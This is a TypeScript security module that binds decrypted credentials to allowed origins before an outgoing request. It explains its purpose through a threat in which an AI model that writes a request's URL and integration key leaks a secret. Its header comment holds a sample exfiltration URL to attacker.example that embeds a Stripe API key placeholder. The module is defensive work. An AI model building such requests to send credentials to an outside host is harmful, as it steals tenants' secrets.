/**
 * security/origin-binding.ts — credential-to-origin binding (Cofre R-2; invariant I6).
 *
 * THE PROBLEM. Two HTTP paths injected a decrypted credential into a request whose destination the
 * MODEL chose, and the path where the model had the most authorship had the weakest control:
 *
 *   - `automation/executors/api-call.ts` interpolates the decrypted fields of a model-supplied
 *     `authIntegrationKey` into a model-supplied URL. The only gate was `guardedFetch`'s SSRF
 *     check, which by design permits every PUBLIC host — so
 *     `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` plus
 *     `authIntegrationKey: "stripe"` exfiltrates a live tenant secret in one hop, and
 *     `rehearsal.ts` lets the mid-run fixer author both fields.
 *   - `integrations/action-executor.ts` sent on a bare `globalThis.fetch` behind a `^https?://`
 *     shape check on a baseUrl written verbatim from the model's own `config.json`. No SSRF guard
 *     at all.
 *
 * THE CONTROL. An SSRF guard answers "is this host infrastructure I must not touch". It cannot
 * answer "is this host allowed to see THIS credential" — that is a property of the credential, not
 * of the network. So credential-bearing requests go through `credentialedFetch`, whose options type
 * makes `allowedOrigins` REQUIRED and whose implementation refuses an empty list. There is no way
 * to call it without declaring a binding; that is the point, and it is why this is a separate entry
 * point rather than an optional flag on `guardedFetch`.
 *
 * MATCHING is stricter than the brief's eTLD+1: an entry matches a request host exactly, or as a
 * parent domain of it (`api.stripe.com` matches `stripe.com`'s subtree, `evil-stripe.com` does
 * not). Deriving the allowlist from the integration's OWN declared base URL means the common case
 * needs no new configuration, and the Cofre's per-item `boundOrigins` replaces this derivation
 * later (WS-C) without moving the enforcement point.
 */
import { guardedFetch, type GuardedFetchOptions } from '../services/url-fetcher.js';

/** Refused because the destination is not bound to the credential. Distinct from SsrfError: the
 *  host may be perfectly reachable and still have no business seeing this secret. */
export class CredentialOriginError extends Error {
  /** Mapped to HTTP 422 by the routes layer (`CREDENTIAL_ORIGIN_REFUSED`). */
  readonly code = 'CREDENTIAL_ORIGIN_REFUSED';
  constructor(message: string) {
    super(message);
    this.name = 'CredentialOriginError';
  }
}

export interface CredentialedFetchOptions extends GuardedFetchOptions {
  /**
   * Hosts or origins this credential is bound to. REQUIRED and non-empty — an absent or empty
   * binding refuses rather than defaulting open, because "we could not determine the binding" and
   * "any host is fine" must never be the same code path.
   */
  allowedOrigins: string[];
  /** Named in the refusal message so an operator can see which credential was withheld. */
  credentialLabel?: string;
}

/** The host of an allowlist entry, whether written as a bare host or a full origin. */
function hostOf(entry: string): string | null {
  const trimmed = entry.trim();
  if (!trimmed) return null;
  try {
    if (/^[a-z][a-z0-9+.-]*:\/\//i.test(trimmed)) return new URL(trimmed).hostname.toLowerCase();
  } catch {
    return null;
  }
  // A bare host may still carry a path or port; take the authority's host only.
  const authority = trimmed.split('/')[0] ?? '';
  const host = authority.split('@').pop() ?? '';
  const withoutPort = host.startsWith('[') ? host.slice(0, host.indexOf(']') + 1) : (host.split(':')[0] ?? '');
  return withoutPort.toLowerCase() || null;
}

/** True when `host` is `allowed` or a subdomain of it. Never a suffix-string match: that would let
 *  `evil-stripe.com` satisfy a binding to `stripe.com`. */
export function hostMatchesOrigin(host: string, allowed: string): boolean {
  const h = host.toLowerCase();
  const a = hostOf(allowed);
  if (!a) return false;
  return h === a || h.endsWith(`.${a}`);
}

/** Derive an allowlist entry from an integration's declared base URL (the interim binding until
 *  Cofre items carry their own `boundOrigins`). Returns null when the base URL is unusable. */
export function originFromBaseUrl(baseUrl: string): string | null {
  try {
    return new URL(baseUrl).hostname.toLowerCase() || null;
  } catch {
    return null;
  }
}

/**
 * Assert `url` is bound to at least one allowed origin. Exported so a caller can check BEFORE it
 * decrypts a credential — refusing without ever unwrapping is strictly better than refusing after.
 */
export function assertOriginAllowed(url: string, opts: Pick<CredentialedFetchOptions, 'allowedOrigins' | 'credentialLabel'>): void {
  const label = opts.credentialLabel ? ` for ${opts.credentialLabel}` : '';
  const entries = (opts.allowedOrigins ?? []).map(hostOf).filter((h): h is string => Boolean(h));
  if (entries.length === 0) {
    throw new CredentialOriginError(
      `no bound origin${label}: a credential-bearing request must declare the hosts it may reach`,
    );
  }
  let host: string;
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    throw new CredentialOriginError(`unparseable destination${label}: ${url}`);
  }
  if (!entries.some((entry) => hostMatchesOrigin(host, entry))) {
    throw new CredentialOriginError(
      `destination ${host} is not a bound origin${label} (allowed: ${entries.join(', ')})`,
    );
  }
}

/**
 * Fetch a URL that carries injected credential material. Origin binding first (cheapest, and the
 * one check that must never be skipped), then the existing SSRF guard and its DNS-rebinding
 * re-check. The credential never leaves for an unbound host.
 */
export async function credentialedFetch(url: string, opts: CredentialedFetchOptions): Promise<Response> {
  assertOriginAllowed(url, opts);
  const { allowedOrigins: _a, credentialLabel: _c, ...guarded } = opts;
  return guardedFetch(url, guarded);
}
